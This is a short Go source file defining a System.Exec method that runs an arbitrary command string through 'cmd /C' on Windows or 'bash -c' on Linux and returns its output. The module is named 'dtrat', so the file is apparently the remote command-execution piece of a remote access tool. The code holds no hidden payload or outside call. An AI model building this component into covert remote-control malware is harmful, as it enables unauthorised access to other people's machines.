package system

import (
	"bytes"
	"dtrat/errs"
	"fmt"
	"os/exec"
	"runtime"
)

func (s *System) Exec(cmd string) (string, error) {
	switch runtime.GOOS {
	case "windows":
		return execWin(cmd)
	case "linux":
		return execLinux(cmd)
	default:
		return "", errs.ErrUnsupportedOs
	}
}

func execWin(command string) (string, error) {
	cmd := exec.Command("cmd", "/C", command)
	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr

	err := cmd.Run()
	if err != nil {
		return stderr.String(), fmt.Errorf("cmd.Run: %w", err)
	}

	return out.String(), nil
}

func execLinux(command string) (string, error) {
	cmd := exec.Command("bash", "-c", command)
	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr

	err := cmd.Run()
	if err != nil {
		return stderr.String(), fmt.Errorf("cmd.Run: %w", err)
	}

	return out.String(), nil
}
